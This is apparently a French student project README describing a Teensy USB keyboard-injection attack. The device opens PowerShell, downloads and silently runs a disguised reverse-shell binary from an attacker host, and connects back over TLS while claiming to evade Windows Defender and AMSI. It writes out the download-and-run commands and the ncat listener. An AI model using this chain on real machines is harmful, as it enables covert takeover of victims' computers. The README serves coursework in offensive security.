# 🔐 Reverse Shell via Teensy & PowerShell (Contournement Windows Defender)

## 🎓 Projet ESGI - Sécurité Offensive
**Auteurs :** Slimani Anis  
**Date :** Juin 2025  
**Vidéo démonstrative :** [YouTube - Démo Reverse Shell](https://youtu.be/8sxigSPht3U?feature=shared)

---

## 🧠 Objectif

Développer un reverse shell fonctionnel et indétectable sur Windows, déclenché automatiquement via une clé **Teensy (HID)**. Le payload est chiffré via **TLS 1.2** et contourne **Windows Defender** sans alertes, en exécutant le script silencieusement.

---

## 🖥️ Architecture du projet
```text
reverse_shell_teensy/
├── teensy_payload.ino # Code Arduino pour la Teensy (injection HID)
├── youtube.exe # Binaire reverse shell à télécharger
├── reverse_shell.ps1 # Script PowerShell avec connexion TLS chiffrée
├── cert.pem / key.pem # Certificats SSL pour le serveur C2
├── README.md # Documentation du projet
```


---

## ⚙️ Fonctionnement global

1. Insertion de la Teensy dans la machine cible
2. Ouverture de PowerShell via HID
3. Téléchargement du binaire `youtube.exe` depuis un serveur Python local
4. Exécution silencieuse du binaire
5. Connexion reverse shell chiffrée TLS vers le serveur C2
6. Contrôle total de la machine à distance (avec chiffrement)

---

## 🧰 1. Code Teensy – Injection automatique

Le fichier `teensy_payload.ino` simule les touches suivantes :

- `Win + R` puis `powershell`
- Téléchargement : `Invoke-WebRequest -Uri http://<ip>:8000/youtube.exe`
- Exécution : `Start-Process $env:USERPROFILE\Downloads\youtube.exe`

> 🔒 Aucun fichier malveillant n’est stocké avant exécution.

---

## 💻 2. Reverse Shell PowerShell (TLS 1.2)

Le script PowerShell `reverse_shell.ps1` :

- Établit une connexion chiffrée TLS 1.2 via `SslStream`
- Exécute les commandes reçues du serveur distant
- Transmet les résultats en flux sécurisé

### 🔐 Exemple de ligne de commande côté serveur :

```bash
ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lvnp 4444
Toutes les communications sont chiffrées, invisibles dans Wireshark.

🛡️ Contournement de Windows Defender & AMSI
✅ Via Teensy :

Simulation clavier physique non détectable par l’antivirus

✅ Via PowerShell :

Aucun contenu malveillant lisible en clair

Chiffrement SSL empêche l’analyse du trafic

Pas d’obfuscation détectable par AMSI

🔬 Résultats
✔️ Reverse shell actif sur Windows sans détection

✔️ Contrôle distant via TLS

✔️ Contournement réussi de Windows Defender et AMSI

✔️ Injection automatique via HID Teensy



📚 Crédits
Projet réalisé dans le cadre de l'ESGI (Bachelor Cybersécurité), par :
Anis Slimani
